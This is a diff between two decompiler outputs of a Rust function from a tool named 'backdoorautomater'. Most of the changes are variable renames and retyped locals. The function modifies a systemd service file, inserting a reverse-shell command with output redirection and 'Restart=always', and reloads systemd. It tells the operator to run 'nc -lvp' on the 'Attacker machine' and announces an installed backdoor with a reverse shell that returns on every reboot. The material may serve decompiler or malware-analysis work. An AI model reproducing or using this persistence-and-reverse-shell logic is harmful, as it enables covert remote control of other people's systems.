@@ -1,12 +1,12 @@
 fn backdoorautomater::modifyservice::modify_service(a0: &struct24, a1: &struct24, a2: &str, a3: &struct24, a4: &struct24) {
     let v0: u32;  // [bp-0x4a8]
-    let v1: struct16;  // [bp-0x380], Other Possible Types: void*, u64
+    let v1: gimli::read::rnglists::Range;  // [bp-0x380], Other Possible Types: void*, u64
     let v2: u64;  // [bp-0x380]
     let v3: void*;  // [sp-0x378], Other Possible Types: u64
     let v4: u32;  // [sp-0x36c]
-    let v5: struct16;  // [sp-0x368], Other Possible Types: alloc::borrow::Cow<str>, core::result::Result<std::process::Output, std::io::error::Error>, struct24, alloc::vec::Vec<u8, alloc::alloc::Global>
+    let v5: gimli::read::rnglists::Range;  // [sp-0x368], Other Possible Types: alloc::borrow::Cow<str>, core::result::Result<std::process::Output, std::io::error::Error>, struct24, alloc::vec::Vec<u8, alloc::alloc::Global>
     let v6: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x368], Other Possible Types: u64
-    let v7: alloc::string::String;  // [bp-0x368], Other Possible Types: u128
+    let v7: alloc::string::String;  // [bp-0x368], Other Possible Types: u64
     let v8: u64;  // [bp-0x358]
     let v9: struct24;  // [sp-0x328], Other Possible Types: struct56
     let v10: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x328], Other Possible Types: u128
@@ -24,17 +24,17 @@ fn backdoorautomater::modifyservice::modify_service(a0: &struct24, a1: &struct24
     let v23: i64;  // [bp-0x2b8]
     let v24: u64;  // [bp-0x2b0]
     let v25: struct24;  // [bp-0x2a8]
-    let v26: std::io::stdio::Stdin;  // [bp-0x288], Other Possible Types: &str, (usize, std::backtrace_rs::symbolize::gimli::Mapping), struct149, alloc::string::String, struct24
+    let v26: (usize, std::backtrace_rs::symbolize::gimli::Mapping);  // [bp-0x288], Other Possible Types: std::io::stdio::Stdin, &[u8], struct149, alloc::string::String, struct24
     let v27: (usize, std::backtrace_rs::symbolize::gimli::Mapping);  // [bp-0x288], Other Possible Types: struct24
     let v28: (usize, std::backtrace_rs::symbolize::gimli::Mapping);  // [bp-0x288]
     let v29: struct24;  // [bp-0x288]
-    let v30: &str;  // [bp-0x288], Other Possible Types: struct24
+    let v30: &[u8];  // [bp-0x288], Other Possible Types: struct24
     let v31: struct24;  // [bp-0x288]
-    let v32: &str;  // [bp-0x288]
-    let v33: &str;  // [bp-0x288]
+    let v32: &[u8];  // [bp-0x288]
+    let v33: &[u8];  // [bp-0x288]
     let v34: struct24;  // [bp-0x288]
     let v35: void*;  // [bp-0x278], Other Possible Types: u128
-    let v36: &str;  // [bp-0x278]
+    let v36: &[u8];  // [bp-0x278]
     let v37: u64;  // [bp-0x270]
     let v38: u64;  // [bp-0x270]
     let v39: i64;  // [bp-0x1b0]
@@ -62,9 +62,8 @@ fn backdoorautomater::modifyservice::modify_service(a0: &struct24, a1: &struct24
     let v61: u64;  // [bp-0xd8]
     let v62: alloc::string::String;  // [bp-0xb0]
     let v63: u128;  // [bp-0xa8]
-    let v64: &str;  // [bp-0x98]
+    let v64: &[u8];  // [bp-0x98]
     let v65: struct24;  // [bp-0x88]
-    let v66: (usize, std::backtrace_rs::symbolize::gimli::Mapping);  // [bp-0x68]
     let v67: struct24;  // [bp-0x48]
     let v69: u32;  // edx
     let v70: u64;  // r14
@@ -88,10 +87,10 @@ fn backdoorautomater::modifyservice::modify_service(a0: &struct24, a1: &struct24
     let v99: void*;  // rsi
     let v102: u128;  // xmm1
     let v104: core::slice::iter::Iter<std::backtrace::BacktraceSymbol>;  // rax:rdx
-    let v105: core::slice::iter::Iter<std::backtrace::BacktraceSymbol>;  // rax:rdx
-    let v106: core::result::Result<usize, std::io::error::Error>;  // rax:rdx
-    let v107: &str;  // rax:rdx
-    let v108: &str;  // rax:rdx
+    let v105: core::result::Result<usize, std::io::error::Error>;  // rax:rdx
+    let v106: &[u8];  // rax:rdx
+    let v107: core::slice::iter::Iter<std::backtrace::BacktraceSymbol>;  // rax:rdx
+    let v108: &[u8];  // rax:rdx
 
     v70 = v69;
     v16 = 0;
@@ -106,13 +105,13 @@ fn backdoorautomater::modifyservice::modify_service(a0: &struct24, a1: &struct24
         field_0: v57 & -0x100 | 1
         field_8: v2 & -0x100 | 1
     };
-    v105 = <&alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(v72);
-    v39 = v105.end_or_len;
-    v74 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v105.ptr.pointer);
+    v104 = <&alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(v72);
+    v39 = v104.end_or_len;
+    v74 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v104.ptr.pointer);
     v75 = v70;
     if v74 {
         while (!<&str as core::str::pattern::Pattern>::is_contained_in(*((v74 + 8) as &i64), *((v74 + 16) as &i64), v73, v72)) {
-            v74 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v105.ptr.pointer);
+            v74 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v104.ptr.pointer);
             v76 += 1;
             if !v74 {
                 goto LABEL_453e65;
@@ -151,8 +150,7 @@ fn backdoorautomater::modifyservice::modify_service(a0: &struct24, a1: &struct24
                 alloc::vec::Vec<T,A>::extend_from_slice(&v10, "/");
                 alloc::vec::Vec<T,A>::extend_from_slice(&v10, *((a4 + 8) as &i64), *((a4 + 16) as &i64));
                 alloc::vec::Vec<T,A>::extend_from_slice(&v10, " 0>&1'&\n");
-                v26 = v13;
-                alloc::vec::Vec<T,A>::insert(v72, v76, &v26);
+                alloc::vec::Vec<T,A>::insert(v72, v76, &v13);
                 v26 = <T as alloc::slice::hack::ConvertVec>::to_vec("Restart=always\n");
                 v65 = v27;
                 v81 = alloc::vec::Vec<T,A>::insert(v72, v76, &v65) & -0x100 | 1;
@@ -239,8 +237,8 @@ LABEL_453e9a:
                 if !v73 {
                     break;
                 }
-                v107 = core::str::<impl str>::trim_matches(*((v73 + 8) as &i64), *((v73 + 16) as &i64));
-                if <[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v107.ptr, v107.len, "[Service]") {
+                v108 = core::str::<impl str>::trim_matches(*((v73 + 8) as &i64), *((v73 + 16) as &i64));
+                if <[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v108.ptr, v108.len, "[Service]") {
                     break;
                 }
             }
@@ -255,8 +253,8 @@ LABEL_453e9a:
                     break;
                 }
                 v86 = v85;
-                v108 = core::str::<impl str>::trim_matches(*((v73 + 8) as &i64), *((v73 + 16) as &i64));
-                if <[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v108.ptr, v108.len, "[Install]") && v73 {
+                v106 = core::str::<impl str>::trim_matches(*((v73 + 8) as &i64), *((v73 + 16) as &i64));
+                if <[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v106.ptr, v106.len, "[Install]") && v73 {
                     if v86 > v83 {
                         v88 = v86 - 1;
                         v26 = v17;
@@ -264,10 +262,9 @@ LABEL_453e9a:
                         alloc::vec::Vec<T,A>::insert(v24, v88, &v26);
                         v1 = 0;
                         v26 = <T as alloc::slice::hack::ConvertVec>::to_vec("Restart=always\n");
-                        v66 = v27;
                         v71 = (v71 & -0x100 | 1) & -0x100 | 1;
                         v1 = 0;
-                        alloc::vec::Vec<T,A>::insert(v24, v88, &v66);
+                        alloc::vec::Vec<T,A>::insert(v24, v88, &v27);
                     } else {
                         v26 = v17;
                         v1 = 0;
@@ -284,18 +281,17 @@ LABEL_453e9a:
         }
     }
 LABEL_4546a5:
-    v104 = <&alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(v89);
+    v107 = <&alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(v89);
     v5 = struct16 {
-        field_0: v104.ptr.pointer
-        field_8: v104.end_or_len
+        field_0: v107.ptr.pointer
+        field_8: v107.end_or_len
     };
     v90 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v5);
     v91 = (v71 & -0x100 | 1) & -0x100 | 1;
     if v90 {
         do {
             if <&str as core::str::pattern::Pattern>::is_contained_in(*((v90 + 8) as &i64), *((v90 + 16) as &i64), v73, v72) {
-                v28 = v55;
-                alloc::vec::Vec<T,A>::insert(v89, v92, &v28);
+                alloc::vec::Vec<T,A>::insert(v89, v92, &v55);
             }
             v90 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v5);
             v92 += 1;
@@ -315,7 +311,7 @@ LABEL_4546a5:
     v64 = "systemctl daemon-reload";
     v26 = std::process::Command::new("sh");
     v5 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v64 as u64));
-    core::result::Result<T,E>::expect(&v105.ptr.pointer, &v5, "src/modifyservice.rs");
+    core::result::Result<T,E>::expect(&v104.ptr.pointer, &v5, "src/modifyservice.rs");
     v5 = alloc::string::String::from_utf8_lossy(v28.__0, v42);
     v29 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v5), v73);
     v25 = v30;
@@ -332,7 +328,7 @@ LABEL_4546a5:
     v97 = v9.field_16;
     v41 = v15;
     v40 = v97;
-    *(&v105.ptr.pointer as &u128) = v9.field_0;
+    *(&v104.ptr.pointer as &u128) = v9.field_0;
     v5 = alloc::string::String::from_utf8_lossy(v41 as i64, v42);
     v31 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v5), v73);
     v14 = v35;
@@ -358,11 +354,11 @@ LABEL_4546a5:
             break;
         }
         println!("\x1b[31mAre you ready to get access with the backdoor ? \n");
-        println!("On your 'Attacker machine' please put this nc command before to continue : nc -lvp {} \n", &v28 as u8);
+        println!("On your 'Attacker machine' please put this nc command before to continue : nc -lvp {} \n", &v61 as u8);
         println!("When you are ready, please put 'ok' in lowercase");
         v26 = std::io::stdio::stdin();
-        v106 = std::io::stdio::Stdin::read_line(&v26, &v44);
-        core::result::Result<T,E>::expect(v106 as i64, *((&v106 as &char + 8) as &i64));
+        v105 = std::io::stdio::Stdin::read_line(&v26, &v44);
+        core::result::Result<T,E>::expect(v105 as i64, *((&v105 as &char + 8) as &i64));
         v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(core::str::<impl str>::trim_end_matches(1, v46, 10), v73);
         v8 = v35;
         v7 = *(&v26.field_0 as &i128);
@@ -383,7 +379,7 @@ LABEL_4546a5:
     v102 = v12.field_16;
     v41 = v15;
     v40 = v102;
-    *(&v105.ptr.pointer as &u128) = v12.field_0;
+    *(&v104.ptr.pointer as &u128) = v12.field_0;
     v5 = alloc::string::String::from_utf8_lossy(v41 as i64, v42);
     v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v5), v73);
     v9 = struct24 {
@@ -396,7 +392,7 @@ LABEL_4546a5:
     };
     backdoorautomater::sanitizer::sanitize_ex_stderr(&v25);
     println!("\x1b[36mBackdoor is installed and you have a reverse shell ! When the service will restart or the machine will reboot you will have a new reverse shell !\n");
-    println!("But, don't forget to execute this command before: nc -lvp {}\n", &v28 as u8);
+    println!("But, don't forget to execute this command before: nc -lvp {}\n", &v61 as u8);
     println!("If you loose the reverse shell, don't worry ! Put again nc command on your attacker machine and wait\x1b[0m\n");
     return;
 }
